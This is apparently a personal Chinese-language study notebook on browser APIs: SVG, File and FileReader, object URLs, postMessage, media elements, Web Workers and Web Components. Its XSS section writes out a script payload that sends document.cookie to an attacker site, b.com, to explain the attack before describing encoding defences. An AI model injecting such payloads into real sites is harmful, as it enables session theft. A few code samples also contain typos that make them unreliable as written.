      .fancy {
        fill: none;
        stroke: black; /* similar to border-color */
        stroke-width: 3pt; /* similar to border-width */
      }
      上面代码中,
      fill属性表示填充色,
      stroke属性表示描边色,
      stroke-width属性表示边框宽度。
    除了<circle>标签表示圆,SVG文件还可以使用表示其他形状的标签。
      <svg>
        <!-- 直线 -->
        <line x1="0" y1="0" x2="200" y2="0" style="stroke:rgb(0,0,0);stroke-width:1"/>
        <!-- 矩形 -->
        <rect x="0" y="0" height="100" width="200" style="stroke: #70d5dd; fill: #dd524b" />
        <!-- 椭圆 -->
        <ellipse cx="60" cy="60" ry="40" rx="20" stroke="black" stroke-width="5" fill="silver"/>  <polygon fill="green" stroke="orange" stroke-width="10" points="350, 75  379,161 469,161 397,215 423,301 350,250 277,301 303,215 231,161 321,161"/><polygon>
        <!-- 多边形 -->
        <polygon points="60,20 100,40 100,80 60,100 20,80 20,40"/>
        <!-- 路径 -->
        <path id="path1" d="M160.143,196c0,0,62.777-28.033,90-17.143c71.428,28.572,73.952-25.987,84.286-21.428" style="fill:none;stroke:2;"></path>
        <!-- 文本 -->
        <text x="250" y="25">Hello World</text>
      </svg>
      上面代码中,
      line、rect、ellipse、polygon和path标签,
      分别表示线条、矩形、椭圆、多边形、路径和文字。
    g 标签用于将多个形状组成一组(group)。
      <svg width='300' height='180'>
        <g transform='translate(5, 15)'>
          <text x="0" y="0">Howdy!</text>
          <path d="M0,50 L50,0 Q100,0 100,50"
            fill="none" stroke-width="3" stroke="black" />
        </g>
      </svg>
    SVG文件里面还可以插入图片文件。
      <svg viewBox="0 0 1 1" width="100" height="100">
        <image xlink:href="path/to/image.jpg"
          width="100%" height="100%"
          preserveAspectRatio="xMidYMid slice"/>
      </svg>
      上面代码中,
      viewBox表示长宽比例,这里是 1:1 ,即正方形,
      第一对 width 和 height 表示图形默认的宽和高(CSS代码可以覆盖掉这两个值),
      xlink:href表示引用图像的来源,
      第二对width和height表示图像占满整个SVG图形,
      preserveAspectRatio等于xMidYMid slice,
      告诉浏览器置中图片,并且删去溢出的部分,更多参数可以参考MDN。
  DOM 操作
    如果SVG代码直接写在HTML网页之中,它就成为网页DOM的一部分,可以直接用DOM操作。
    <svg id="mysvg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 600" preserveAspectRatio="xMidYMid meet" >
      <circle id="mycircle" cx="400" cy="300" r="50" />
    <svg>
    上面代码插入网页之后,就可以用CSS定制样式。
    circle {
      stroke-width: 5;
      stroke: #f00;
      fill: #ff0;
    }
    circle:hover {
      stroke: #090;
      fill: #fff;
    }
    然后,可以用JavaScript代码操作SVG文件。
    var mycircle = document.getElementById('mycircle');
    mycircle.addEventListener('click', function(e) {
      console.log('circle clicked - enlarging');
      mycircle.setAttributeNS(null, 'r', 60);
    }, false);
    上面代码指定,如果点击图形,就改写circle元素的r属性。
  JavaScript操作
    获取SVG DOM
      如果使用<img>标签插入SVG文件,就无法获取SVG DOM。
      使用<object>、<iframe>、<embed>标签,可以获取SVG DOM。
      var svgObject = document.getElementById('object').contentDocument;
      var svgIframe = document.getElementById('iframe').contentDocument;
      var svgEmbed = document.getElementById('embed').getSVGDocument();
      由于SVG文件就是一般的XML文件,因此可以用DOM方法,选取页面元素。
      // 改变填充色
      document.getElementById('theCircle').style.fill = 'red';
      // 改变元素属性
      document .getElementById('theCircle') 
      .setAttribute('class', 'changedColors');
      // 绑定事件回调函数
      document .getElementById('theCircle')
      .addEventListener('click', function () {
        console.log('clicked')
      });
    读取svg源码
      由于svg文件就是一个XML代码的文本文件,因此可以通过读取XML代码的方式,读取SVG源码。
      <div id="svg-container">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xml:space="preserve" width="500" height="440" >
          <!-- svg code -->
        </svg>
      </div>
      使用XMLSerializer实例的serializeToString方法,获取svg元素的代码。
      var svgString = new XMLSerializer()
      .serializeToString(document.querySelector('svg'));
    将svg图像转为canvas图像
      首先,需要新建一个Image对象,将svg图像指定到该Image对象的src属性。
      var img = new Image();
      var svg = new Blob([svgString], {type: "image/svg+xml;charset=utf-8"});
      var DOMURL = self.URL || self.webkitURL || self;
      var url = DOMURL.createObjectURL(svg);
      img.src = url;
      然后,当图像加载完成后,再将它绘制到<canvas>元素。
      img.onload = function () {
        var canvas = document.getElementById('canvas');
        var ctx = canvas.getContext('2d');
        ctx.drawImage(img, 0, 0);
      };
      e.g.: 假定我们要将下面的表格画成图形。
      
      Date	Amount
      2014-01-01	$10
      2014-02-01	$20
      2014-03-01	$40
      2014-04-01	$80
      上面的图形,可以画成一个坐标系,
      Date作为横轴,
      Amount作为纵轴,
      四行数据画成一个数据点。
      <svg width="350" height="160">
        <g class="layer" transform="translate(60,10)">
          <circle r="5" cx="0"   cy="105" />
          <circle r="5" cx="90"  cy="90"  />
          <circle r="5" cx="180" cy="60"  />
          <circle r="5" cx="270" cy="0"   />
          <g class="y axis">
            <line x1="0" y1="0" x2="0" y2="120" />
            <text x="-40" y="105" dy="5">$10</text>
            <text x="-40" y="0"   dy="5">$80</text>
          </g>
          <g class="x axis" transform="translate(0, 120)">
            <line x1="0" y1="0" x2="270" y2="0" />
            <text x="-30"   y="20">January 2014</text>
            <text x="240" y="20">April</text>
          </g>
        </g>
      </svg>
webgl
File API,文件和二进制数据的操作 「HTML5+」
  PS: HTML5在DOM中为文件输入元素添加了一个files集合,
    文件输入元素如 <input type="file" id="myFile" />,
    通过文件输入字段选择文件时,files集合中将包含一组File对象.
    HTML5支持一次选择多个文件,若件选择控件没有开启多选模式,那么数组只有一个元素.
  FileList 和 File 对象    
    PS:FileList 表示files集,files为change事件对象的 e.target.files,
      FileList 为 File 对象组成的数组;
      File 对象,负责处理那些以文件形式存在的二进制数据,也就是操作本地文件,
      每个File对象对应着一个文件,
      包含了文件的一些元信息,比如文件名、上次改动时间、文件大小和文件类型。
    fil.name;  本地文件系统中的文件名
    fil.type;  文件的MIME类型,字符串
    fil.size;  文件的字节大小
    fil.lastModified      文件的上次修改时间,格式为时间戳。
    fil.lastModeFiedDate  文件上一次被修改的时间,格式为Date对象实例 [仅Chrome支持]
    e.g.: 采用拖放方式,也可以得到FileList对象。
      var dropZone = document.getElementById('drop_zone');
      dropZone.addEventListener('drop', handleFileSelect, false);
      function handleFileSelect(evt) {
        evt.stopPropagation();
        evt.preventDefault();
        var files = evt.dataTransfer.files; // FileList object.
        // ...
      }
  FileReader 对象  用于读取文件,即把文件内容读入内存
    PS:FileReader类型实现的是一种异步文件读取机制
    它的参数是File对象或Blob对象
    var fr =new FileReader(); 创建fr对象
    fr.result;  文件的URI数据,其他操作的结果都存放在该属性中
      当是图片数据时,可作为图片的src
    fr.readAsText(Blob|File,encoding)  返回纯文本的形式
      返回文本字符串,并保存在result属性中 [?]
      encoding   前一个参数的编码方法,可选 默认情况下,文本编码格式是’UTF-8’,
        可以通过可选的格式参数,指定其他编码格式的文本。
      该方法是异步方法,一般监听onload件,用来确定文件是否加载结束,
      方法是判断FileReader实例的result属性是否有值。
    fr.readAsDataURL(Blob|File);       得到一个基于Base64编码的data-uri对象     
      返回一个data URL,它的作用基本上是将文件数据进行Base64编码。
      可以将返回值设为图像的src属性。
      读取文件以数据URI的形式保存在result属性中 
    fr.readAsBinaryString(Blob|File)   得到二进制字符串
      该字符串每个字节包含一个0到255之间的整数。
      可以读取任意类型的文件,而不仅仅是文本文件,返回文件的原始的二进制内容。
      与 XMLHttpRequest.sendAsBinary 方法结合使用,可以使用JS上传任意文件到服务器。     
      var reader = new FileReader();
      reader.onload = function(e) {
        var rawData = reader.result;
      }
      reader.readAsBinaryString(file);
    fr.readAsArrayBuffer(Blob|File)    得到一个ArrayBuffer对象
      返回一个类型化数组(ArrayBuffer),即固定长度的二进制缓存数据。
      在文件操作时(比如将JPEG图像转为PNG图像),这个方法非常方便。
      var reader = new FileReader();
      reader.onload = function(e) {
        var arrayBuffer = reader.result;
      }
      reader.readAsArrayBuffer(file);
    fr.abort()  用于中止文件上传
      var reader = new FileReader();
      reader.abort();
    ◆事件
      FileReader对象采用异步方式读取文件,可以为一系列事件指定回调函数。
    load      读取成功后触发
      load事件的回调函数接受一个事件对象,该对象的target.result就是文件的内容。
      下面是一个使用 readAsDataURL 方法,为img元素添加src属性的例子。
      var reader = new FileReader();
      reader.onload = function(e) {
        document.createElement('img').src = e.target.result;
        // 此处 reader.result 等价于 e.target.result ,但e.target.result仅为临时的
      };
      reader.readAsDataURL(f);
    progress  进度事件,每过50ms左右,就会触发一次
      e.g.: 用来显示读取进度
        var reader = new FileReader();
        reader.onprogress = updateProgress;
        function updateProgress(evt) {
          if (evt.lengthComputable) {
            var percentLoaded = Math.round((evt.loaded / evt.totalEric Bidelman) * 100);
            var progress = document.querySelector('.percent');
            if (percentLoaded < 100) {
              progress.style.width = percentLoaded + '%';
              progress.textContent = percentLoaded + '%';
            }
          }
        }
    error     发生错误时触发事件
      触发error事件时,相关的信息在FileReader的error.code,表示错误码
      1 未找到文件
      2 安全性错误
      3 表示读取中断
      4 文件不可读
      5 编码错误
      e.g.:
        var reader = new FileReader();
        reader.onerror = errorHandler;
        function errorHandler(evt) {
          switch(evt.target.error.code) {
            case evt.target.error.NOT_FOUND_ERR:
            alert('File Not Found!');
            break;
            case evt.target.error.NOT_READABLE_ERR:
            alert('File is not readable');
            break;
            case evt.target.error.ABORT_ERR:
            break;
            default:
            alert('An error occurred reading this file.');
          };
        }
    abort 读取中断或调用reader.abort()方法时触发。
    loadend 读取完成后触发,不管是否成功。触发顺序排在 onload 或 onerror 后面。
    loadstart 读取将要开始时触发
    e.g.:
      var reader = new FileReader();
      reader.onload = function(e) {
        console.log(e.target.result);
      }
      reader.readAsText(blob);
  URL 对象         用于对二进制数据生成URL
    PS:用于生成指向File对象或Blob对象的URL,
      同样的二进制数据, 每调用一次URL.createObjectURL方法,就会得到一个不一样的URL,
      这个URL的存在时间,等同于网页的存在时间,
      一旦网页刷新或卸载,这个URL就失效。
      除此之外,也可以手动调用 URL.revokeObjectURL 方法,使URL失效。
    var objecturl =  window.URL.createObjectURL(blob);  创建url对象实例
      上面的代码会对二进制数据生成一个URL,
      类似于 "blob:http%3A//test.com/666e6730-f45c-47c1-8012-ccc706f17191"
      这个URL可以放置于任何通常可以放置URL的地方,比如img标签的src属性。
    window.URL.revokeObjectURL(objectURL); 使URL失效
    e.g.:在网页插入图片
      var img = document.createElement("img");
      img.src = window.URL.createObjectURL(files[0]);
      img.height = 60;
      img.onload = function(e) {
        window.URL.revokeObjectURL(this.src);
      }
      docment.body.appendChild(img);
      var info = document.createElement("span");
      info.innerHTML = files[i].name + ": " + files[i].size + " bytes";
      docment.body.appendChild(info);
    e.g.:本机视频预览
      var video = document.getElementById('video');
      var obj_url = window.URL.createObjectURL(blob);
      video.src = obj_url;
      video.play()
      window.URL.revokeObjectURL(obj_url);  
跨文档消息传递,cross-document_messaging 
  PS:简称为XDM,指在不同域的页面间传递消息,
    XDM机制出现之前,要稳妥的实现这种通信需花很多功夫
  postMessage(str,URL); 向当前页面中的<iframe>或有当前页弹出的窗口传递数据.
    PS: XDM的核心方法
    Arguments:接收两个参数,一条消息和表示域名的字符串
      表示中的文档必须来源于指定的域,若匹配,消息会传递到框架中,否则无动作.
      若把第二个参数设置为"*",则表示可以把消息发送给来自任何域的文档
    e.g. :
    var iframew =document.getElementById("myframe").contentWindow;
    // 所有支持XDM的浏览器也支持iframe的 contentWindow属性
    iframew.postMessage("a secret","https://www.baidu.com")
  message 事件
    PS:接收到XDM消息时,会触发window对象的message事件
      该事件以异步形式触发
    e.data
    e.origin
    e.source
 (详参 JavaScript高级程序设计 481页)
audio/video  [详见 JavaScript高级程序设计 486 页] 「HTML5」
  var audio =document.querySelector('audio'); 获取audio元素对象
  var video =document.querySelector('video'); 获取video元素对象
  方法
    a.play()         播放
    a.pause()        暂停
    a.load()         重新载入音频
    a.fastSeek()     在音频播放器中指定播放时间
    a.canPlayType()  检查浏览器是否能够播放指定的音频类型
    a.addTextTrack() 向音频添加新的文本轨道
    a.requestFullscreen() 全屏
    a.exltFullscreen()    退出全屏
    a.canPlayType()  确定浏览器可播放一媒体格式的可能性
      返回值为:空字符串,"maybe"或"probably"
        若浏览器无法播放该格式,返回空字符串""
        若浏览器认为有可能播放该格式,返回"maybe"
        若浏览器认为能够播放改格式,返回"probably"
      e.g.
        video.canPlayType("video/ogg")
        只传入一个短形式的格式,只可能得到""或"maybe"
        video.canPlayType('video/ogg; codecs="theora,vorbis"')
        若传入带编解码的具体类型,就可能达到到""、"maybe"或"probably"作为答案
  属性
    a.autoplay       读写 自动播放状态
    a.src            读写 音频src
    a.controls       设置/返回 音频是否应该显示控件(比如播放/暂停等)
    a.duration       读写 音频时长(单位为秒)
      返回值类型为数值
      在加载完音频之前,获取不到,返回NaN(往往需要和canplay事件配合使用)
    a.currentTime    读写 当前播放时长(单位为秒)
      返回值类型为数值
    a.volume         读写 音量(范围0-1)
    a.defaultMuted   设置/返回 音频默认是否静音
    a.loop           设置/返回 音频是否应在结束时再次播放
    a.muted          设置/返回 是否关闭声音
    a.paused         设置/返回 音频是否暂停
      暂停状态,返回 true;播放状态,则返回 false
    a.playbackRate   设置/返回 音频播放的速度
      a.defaultPlaybackRate  设置/返回 音频的默认播放速度
    a.currentSrc     返回当前音频的 URL
    a.ended          返回音频的播放是否已结束
    a.networkState   返回音频的当前网络状态

    videoWidth
    videoHeight
    error             只读
      video.error
      video.error.code 错误码
    readState
    seeking
  事件
    play
    pause
    progress
    error
    abort
    waiting
    loadedmetadata
    volumechange
    timeupdate      音频/视频(audio/video)的播放位置发生改变时触发
      若视频在播放时,位置一直在改变,则每秒触发一次
      具体触发情况：
        播放音频/视频(audio/video)时
        移动音频/视频(audio/video)播放位置时
    canplay         表示音频/视频缓冲完毕可以播放时触发
    ended           当媒介已抵达结尾时
    pause           当媒介数据暂停时运行脚本
    playing         当媒介数据正在播放时运行脚本
  Remarks:
    直接改变音频的src,会立即切换播放;但改变其<source>需要重新加载才会切换播放.
Web_Workers 工作线程 「HTML5」
  JavaScript是单线程,一次只能做一件事.
  HTML5 可使JS创建多个Web工作线程.
  通过 window["Worker"] 来查看是否支持Web工作线程.
  工作线程对象(在主JS中)
    工作线程由一个单独的JavaScript文件定义
    无法访问主浏览器代码能够访问的很多数据
    创建一个工作线程对象
      通过一JS文件创建一个工作线程对象.
      var worker =new Worker("worker.js")
      可以通过一个JS文件创建多个对象,也可通过不同的JS文件创建其他的对象
      worker.js 表示一个JS文件的路径,且该JS文件不需引入到HTML中.
    属性
      onmessage  定义从 工作线程JS 传来的消息的处理程序
        为该属性定义一个处理函数,收到一个消息就会调用这个处理函数
        处理函数的参数的data属性即为 工作线程发回的消息
        event.data   表示 工作线程JS 发送的消息
        event.target 表示发出消息的这个工作线程
        e.g.
          worker.onmessage =function(event){
            var message =event.data;
          }
      onerror    处理工作线程中的错误
        worker.onerror =function(error){
          console.log("There was an error in" + error.filename + "at line number" + error.lineno + ":" + error.message);
        }
    方法
      postMessage  发送消息给工作线程
        worker.postMessage()
        参数可可以是:字符串、数组、对象等(但不能发送函数)
      terminate    终止工作线程
      worker.terminate() 若工作线程在运行,则会使其异常停止,且无法再启用,只能再新建
  定义工作线程JS文件
    使用一个onmessage定义一个 接到消息后进行 处理的程序
      e.g. onmessage = PP;
        function PP(event){
          // 如果主程序发来"ping",则工作线程JS 回复"pong"
          if(event.data =="ping"){
            postMessage("pong")
          }
        }
    importScripts 函数
      使用 importScripts 可向工作线程JS文件中导入一个或多个JS文件
      importScripts("http://big.com/a.js","https://www.baidu.com/b.js")
      多个JS间使用逗号分割.
      也可使用 importScripts 建立JSONP请求
        e.g.
          function makeServerRequest(){
            importScripts("http://SomeServer.com?callback=handleRequest");
            function handleRequest(response){
              postMessage(response);
            }
          }
          makeServerRequest();
    close         停止工作
      close() 让工作线程停止工作.
  e.g. 工作线程JS 接收命令执行操作 并返回
     (谷歌浏览器报错,其他浏览器可以使用)
      manager.js 文件中(需要链接到HTML文件中)
        window.onload =function(){
          var worker =new Worker("worker.js");
          worker.postMesage("ping");
          worker.onmessage =function(event){
            var message ="工作线程JS返回的消息:"+event.data;
            alert(message);
          }
        }
      worker.js 文件中(不需引入HTML文件中)
        onmessage =function(event){
          if(event.data == "ping"){
            postMessage("pong")
          }
        }
◆其他 
  Img Ping 跨域 
    PS:一网页可以从任何网页中加载图像,而无跨域问题,也是在线广告跟踪浏览量的主要方式;
      动态的创建图像,使用load和error事件来处理响应
      图像Ping时与服务器进行简单、单向的跨域通信的一种方式
      请求的数据是通过查询字符串形式发送
      响应可以是任意内容
      请求从设置src属性时发生
    e.g. :
      var img =new Image();
      img.onload =img.onerror =function(){
        console.log(1);
      }
      img.src ="https://www.baidu.com?name=abc"; // 请求中发送了一个name参数
      onload 和 onerror 事件处理程序指定为同一个函数,
      则无论什么响应,请求完成都能得到通知
    图像Ping的缺点
      只能发送 GET 请求,无法访问服务器的响应文本
      只能由从浏览器到服务器间的单向通信
  XML 命名空间
    有了XML命名空间,不同XML文档的元素就可以混合在一起,而不发生命名冲突
    HTML不支持XML命名空间,但XHTML支持XML命名空间
   (更多详情参见 JavaScript高级程序设计 306页)
   (只有在使用XML和XHTML文档时才有用)
  动态加载脚本和样式 
    动态脚本
      当引入太多的js脚本而降低了整站的性能,所以就出现了动态脚本的概念,
      动态脚本就是在适当的时候加载相应的脚本.
      如页面加载时不存在,在将来的某一刻通过修改DOM动态添加的脚本
      动态加载的外部JavaScript文件能够立即运行
    动态样式
      与动态脚本类似,是指在页面刚加载时不存在的样式,后续添加到页面中的.
  HTML DOM 
    使用HTML DOM操作,可查询 HTML DOM手册
    e.g. :
    使用HTML DOM来获取和创建表格
    var table =document.getElementsByTagName('table')[0];
    table.caption.innerHTML;
    // table.caption.innerHTML = 'abc';
    table.tHead;
    table.tBodies[0];
    table.rows.length;             //得到总行数
    // 该处的rows属性为table下提供的
    table.tBodies[0].rows.length;   //得到tbody中的行数
    // 该处的rows属性为tbody下提供的,和上面的rows不是一个.
    table.tBodies[0].rows[0].cells.length;

    使用HTML DOM来创建表格
    var table =document.createElement('table');
    table.width =300;
    table.border =1;
    table.createCaption().innerHTML ='人员表';
    var thead =table.createHead();
    var tr =thead.insertRow(0);
    tr.insertCell(0).innerHTML ="数据1"
    tr.insertCell(2).innerHTML ="数据2"
    tr.insertCell(3).innerHTML ="数据3"
    document.body.appendChild(table);
  JavaScript&XML「详参 JavaScript高级程序设计 552 页」 
  XSS,Cross SiteScript 跨站脚本攻击 
    PS:Web程序中常见的漏洞,属于被动式且用于客户端的攻击方式;
      理论上,所有可输入的地方没有对输入数据进行处理的话,都会存在XSS漏洞;
    原理:攻击者向有XSS漏洞的网站中输入或传入恶意的HTML代码,
      当其它用户浏览该网站时,这段HTML代码会自动执行,从而达到攻击的目的。
      如盗取用户Cookie、破坏页面结构、重定向到其它网站等。
    DOM Based XSS 漏洞: 基于网页DOM结构的攻击,特点是中招的人是少数人
      e.g.:
        如一个获取他人Cookie的超链接,
        'http://www.a.com?content=<script>window.open(“www.b.com?param=”+document.cookie)</script>',
        当点击这个链接的时候「假设点击者已经登录a.com」,浏览器就会直接打开b.com,
        并且把点击者在 a.com 中的 cookie信息发送到 b.com, b.com 就是攻击者搭建的网站,
        当网站接收到该信息时,就盗取了受害者在 a.com 的cookie信息,
        cookie信息中可能存有登录密码,攻击成功！
    Stored XSS 漏洞: 攻击代码已经存储到服务器上或者数据库中
      e.g.:
        a.com 可以发文章,攻击者登录后在a.com 中发布了一篇文章, 文章中包含了恶意代码,
        <script>window.open(“www.b.com?param=”+document.cookie)</script>,
        保存文章,这时当在查看攻击者的文章时就都中招了,
        他们的cookie信息都发送到了攻击者的服务器上,攻击成功！
    XSS防御 
      永远不相信用户的输入,输入验证
      Html encode,对标签进行转换
        比如输入：'<script>window.location.href=”http://www.baidu.com”;</script>',
        最终存储的会是：
        '&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;&lt;/script&gt;'
        在展现时浏览器会对这些字符转换成文本内容显示,而不是一段可执行的代码。
  Web_Components 组件化 
    Custom Elements  自定义HTML元素,包括特定的组成、样式和行为
      支持该标准的浏览器会提供一系列 API 给开发者用于创建自定义的元素,或者扩展现有元素
      document.registerElement('x-aoo', {      // 注册标签
        prototype: Object.create(HTMLElement.prototype, {
          createdCallback: { 
            value: function() {
              //  ...
            } 
          },
          // ...     
        }) 
      })
      x-aoo  标签类型「名字」需使用 - 连接
      不能是以下这些：
      annotation-xml、color-profile、font-face、font-face-src、
      font-face-uri、font-face-format、font-face-name、missing-glyph
      第二个参数是标签相关的配置,提供一个 prototype(以 HTMLElement 的原型为基础创建的对象)
        e.g.:
          在 HTML 中去使用自定义的标签：
          <div> <x-foo></x-foo> </div>
    HTML Imports
    HTML Templates
    Shadow DOM     隔离组件间代码的冲突和影响
    生命周期和回调：
      Web Components 标准提供一系列控制自定义元素的方法
      一个自定义元素会经历以下生命周期：
        注册前创建
        注册自定义元素定义
        在注册后创建元素实例
        元素**到 document 中
        元素从 document 中移除
      ◆回调: 
        PS:元素的属性变化时
          在注册新的自定义元素时指定对应的生命周期回调,为自定义元素添加各种自定义的行为
          生命周期回调包括(括号中为 Custom Elements 2016.07.21 新标准)：
      createdCallback(constructor in class)  自定义元素注册后,在实例化之后会调用
        (多用于做元素的初始化：如**子元素,绑定事件等)
      attachedCallback(connectedCallback)    元素**到 document 时触发
      detachedCallback(disconnectedCallback) 元素从 document 中移除时触发
        (用于做类似 destroy 之类的事情)
      attributeChangedCallback               元素属性变化时触发
        (可以用于从外到内的通信：外部通过修改元素的属性来让内部获取相关的数据并且执行对应的操作)
        这个回调在不同情况下有对应不同的参数：
        设置属性时,参数列表是：属性名称,null,值,命名空间
        修改属性时,参数列表是：属性名称,旧值,新值,命名空间
        删除属性时,参数列表是：属性名称,旧值,null,命名空间
      adoptedCallback：              使用 document.adoptNode(node) 时触发
      e.g.: 
        创建一个自定义的 button-hello 按钮,点击时会 alert('hello world')：
        document.registerElement('button-hello', {
          prototype: Object.create(HTMLButtonElement.prototype, {
            createdCallback: {
              value: function createdCallback() {
                this.innerHTML = '<button>hello world</button>'
                this.addEventListener('click', () => { alert('hello world') })
              }
            }
          })
        })
        注：上述代码执行之后才能使用 <button-hello></button-hello>
    扩展原有元素：
      Web Components 标准提供了一种扩展现有标签的方式
      class ButtonHelloElement extends HTMLButtonElement {
        constructor() {
          super() ,
          this.addEventListener('click', () => {
            alert('hello world') 
          }) 
        } 
      } 
      customElements.define('button-hello', ButtonHelloElement, {
        extends: 'button' 
      })
      使用 is 属性来声明一个扩展的类型
      Web Components 标准中：createElement 和 createElementNS 支持元素扩展：
        const hello = document.createElement('button', 'button-hello')
-------------------------------------------------------------------------待整理
  套接字
  
  <script src="./pubJs/jq-subscribe.js" charset="utf-8"></script>
  <input type="text" name="" value="" id="test1">
  <input type="text" name="" value="" id="test2">
  // 准备在ios上测试
  $.subscribe('evtname',function(ev){
     $('#test2').focus();
  });
  $('#test1').on('input',function(){
    $.publish('evtname');
  });
  // 或者
  setTimeout(function(){
    $('#test1').focus();
  },10000);



